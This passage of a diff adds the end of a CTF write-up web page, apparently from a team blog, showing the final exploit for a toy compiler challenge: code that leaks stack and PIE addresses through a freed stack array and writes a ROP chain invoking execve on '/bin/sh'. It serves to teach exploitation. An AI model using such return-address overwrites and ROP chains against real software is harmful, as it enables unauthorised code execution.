+<span class="k">def</span> <span class="nf">do_rop</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">array_addr</span><span class="p">,</span> <span class="n">gadget_addr</span><span class="p">,</span> <span class="n">syscall_addr</span><span class="p">):</span>
+    <span class="n">do_rop_deeper</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">array_addr</span><span class="p">,</span> <span class="n">gadget_addr</span><span class="p">,</span> <span class="n">syscall_addr</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The indexes into our array were again obtained by printing and some trial and error :).</p>
+
+<h2 id="final-exploit-payload">Final exploit payload</h2>
+
+<p>The final exploit payload looks as follows (containing a bunch of debugging stuff leftover from the CTF :)):</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">fetch</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">ofs</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">array</span><span class="p">[</span><span class="n">ofs</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">store</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">ofs</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+    <span class="n">array</span><span class="p">[</span><span class="n">ofs</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span>
+
+<span class="k">def</span> <span class="nf">print_num</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">putc</span><span class="p">(</span><span class="mi">48</span><span class="p">)</span>  <span class="c1"># '0'
+</span>        <span class="k">return</span>
+    <span class="k">if</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">putc</span><span class="p">(</span><span class="mi">45</span><span class="p">)</span>  <span class="c1"># '-' sign
+</span>        <span class="n">n</span> <span class="o">=</span> <span class="o">-</span><span class="n">n</span>
+    <span class="n">div</span> <span class="o">=</span> <span class="n">n</span> <span class="o">//</span> <span class="mi">10</span>
+    <span class="k">if</span> <span class="n">div</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">print_num</span><span class="p">(</span><span class="n">div</span><span class="p">)</span>
+    <span class="n">putc</span><span class="p">(</span><span class="mi">48</span> <span class="o">+</span> <span class="n">n</span> <span class="o">%</span> <span class="mi">10</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">print_hex_num</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">putc</span><span class="p">(</span><span class="mi">48</span><span class="p">)</span>  <span class="c1"># '0'
+</span>        <span class="k">return</span>
+    <span class="k">if</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">putc</span><span class="p">(</span><span class="mi">45</span><span class="p">)</span>  <span class="c1"># '-' sign
+</span>        <span class="n">n</span> <span class="o">=</span> <span class="o">-</span><span class="n">n</span>
+    <span class="n">div</span> <span class="o">=</span> <span class="n">n</span> <span class="o">//</span> <span class="mi">16</span>
+    <span class="k">if</span> <span class="n">div</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">print_hex_num</span><span class="p">(</span><span class="n">div</span><span class="p">)</span>
+    <span class="n">dig</span> <span class="o">=</span> <span class="n">n</span> <span class="o">%</span> <span class="mi">16</span>
+    <span class="k">if</span> <span class="n">dig</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">:</span>
+        <span class="n">putc</span><span class="p">(</span><span class="mi">48</span> <span class="o">+</span> <span class="n">dig</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">putc</span><span class="p">(</span><span class="mi">97</span> <span class="o">+</span> <span class="n">dig</span> <span class="o">-</span> <span class="mi">10</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">print_arr</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
+        <span class="n">print_num</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+        <span class="n">putc</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
+        <span class="n">print_hex_num</span><span class="p">(</span><span class="n">fetch</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">i</span><span class="p">))</span>
+        <span class="n">putc</span><span class="p">(</span><span class="mi">44</span><span class="p">)</span>
+        <span class="n">putc</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="c1"># ' '
+</span>    <span class="n">putc</span><span class="p">(</span><span class="mh">0xa</span><span class="p">)</span>
+
+<span class="c1"># creates array on stack
+# but after we return the stack frame is gonna be invalid!
+</span><span class="k">def</span> <span class="nf">create_freed_array</span><span class="p">():</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">array</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">a</span>
+
+<span class="c1"># STACK_BASE = 0
+# PIE_BASE = 0
+# ARR_CANARY = 0
+</span>
+<span class="c1"># rop gadgets
+</span>
+<span class="k">def</span> <span class="nf">gadget1</span><span class="p">():</span>
+    <span class="k">return</span> <span class="mh">0x5f5e5a90</span>
+
+<span class="c1"># leak stuff, if we give it the freed array
+</span><span class="k">def</span> <span class="nf">deeper</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="mh">0x43434343</span>
+    <span class="n">a2</span> <span class="o">=</span> <span class="n">a</span>
+    <span class="n">d</span> <span class="o">=</span> <span class="mh">0x44444444</span>
+    <span class="n">print_arr</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">fetch</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="mi">999</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">leak_array_stack</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+    <span class="n">b</span> <span class="o">=</span> <span class="mh">0x42424242</span>
+    <span class="c1"># b = array(10)
+</span>    <span class="k">return</span> <span class="n">deeper</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">pie_deeper</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">fetch</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="mi">999</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">leak_pie_addr</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">pie_deeper</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="c1"># 993 is location of saved rip for returning from this function!
+</span><span class="k">def</span> <span class="nf">do_rop_deeper</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">array_addr</span><span class="p">,</span> <span class="n">gadget_addr</span><span class="p">,</span> <span class="n">syscall_addr</span><span class="p">):</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="mh">0x45454545</span>
+    <span class="n">a2</span> <span class="o">=</span> <span class="n">a</span>
+    <span class="n">array_addr2</span> <span class="o">=</span> <span class="n">array_addr</span>
+    <span class="n">gadget_addr2</span> <span class="o">=</span> <span class="n">gadget_addr</span>
+    <span class="n">syscall_addr2</span> <span class="o">=</span> <span class="n">syscall_addr</span>
+    <span class="n">f</span> <span class="o">=</span> <span class="mh">0x46464646</span>
+    <span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x6e69622f</span>
+    <span class="c1"># necessary, otherwise gcc complains about too large constants :/
+</span>    <span class="n">bin_sh</span> <span class="o">=</span> <span class="n">bin_sh</span> <span class="o">|</span> <span class="p">(</span><span class="mh">0x0068732f</span> <span class="o">*</span> <span class="mi">65536</span> <span class="o">*</span> <span class="mi">65536</span><span class="p">)</span>
+    <span class="n">print_arr</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">store</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="mi">993</span><span class="p">,</span> <span class="n">gadget_addr2</span><span class="p">)</span>
+    <span class="n">store</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="mi">994</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># rdx
+</span>    <span class="n">store</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">bin_sh</span><span class="p">)</span>
+    <span class="n">store</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="mi">995</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># rsi
+</span>    <span class="n">store</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="mi">996</span><span class="p">,</span> <span class="n">array_addr2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="c1"># rdi
+</span>    <span class="n">store</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="mi">997</span><span class="p">,</span> <span class="mi">59</span><span class="p">)</span> <span class="c1"># rax = syscall number
+</span>    <span class="n">store</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="mi">998</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">)</span> <span class="c1"># rbp
+</span>    <span class="n">store</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="mi">999</span><span class="p">,</span> <span class="n">syscall_addr2</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">do_rop</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">array_addr</span><span class="p">,</span> <span class="n">gadget_addr</span><span class="p">,</span> <span class="n">syscall_addr</span><span class="p">):</span>
+    <span class="n">do_rop_deeper</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">array_addr</span><span class="p">,</span> <span class="n">gadget_addr</span><span class="p">,</span> <span class="n">syscall_addr</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">b</span> <span class="o">=</span> <span class="mh">0x41414242</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">create_freed_array</span><span class="p">()</span>
+    <span class="c1"># print_arr(a)
+</span>    <span class="n">array_stack_addr</span> <span class="o">=</span> <span class="n">leak_array_stack</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">pie_addr</span> <span class="o">=</span> <span class="n">leak_pie_addr</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">pie_base</span> <span class="o">=</span> <span class="n">pie_addr</span> <span class="o">-</span> <span class="mh">0x13f2</span>
+    <span class="c1"># array_stack_addr = leak_array_stack(a)
+</span>    <span class="c1"># print_hex_num(0x7ffffffff000)
+</span>    <span class="n">print_hex_num</span><span class="p">(</span><span class="n">array_stack_addr</span><span class="p">)</span>
+    <span class="n">putc</span><span class="p">(</span><span class="mh">0xa</span><span class="p">)</span>
+    <span class="n">print_hex_num</span><span class="p">(</span><span class="n">pie_addr</span><span class="p">)</span>
+    <span class="n">putc</span><span class="p">(</span><span class="mh">0xa</span><span class="p">)</span>
+    <span class="n">do_rop</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">array_stack_addr</span><span class="p">,</span> <span class="n">pie_base</span> <span class="o">+</span> <span class="mh">0x135C</span><span class="p">,</span> <span class="n">pie_base</span> <span class="o">+</span> <span class="mh">0x1661</span><span class="p">)</span>
+    <span class="n">d</span> <span class="o">=</span> <span class="n">getc</span><span class="p">()</span>
+    <span class="n">putc</span><span class="p">(</span><span class="mh">0xa</span><span class="p">)</span>
+    <span class="n">putc</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div class="footnotes" role="doc-endnotes">
+  <ol>
+    <li id="fn:1" role="doc-endnote">
+      <p>This was unchanged from the original project on GitHub. <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:2" role="doc-endnote">
+      <p>Note: I changed the provided python file to make it easier to debug. For example I save the assembly output in a temporary file. <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:3" role="doc-endnote">
+      <p>The <code class="language-plaintext highlighter-rouge">store</code> / <code class="language-plaintext highlighter-rouge">fetch</code> functions might seem a bit weird. I had some issues (because I was wrongly using Python 3.8) and so I just copied the code from GitHub. All <code class="language-plaintext highlighter-rouge">store</code> / <code class="language-plaintext highlighter-rouge">fetch</code> should be replaceable with normal array indexing now. <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+  </ol>
+</div>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
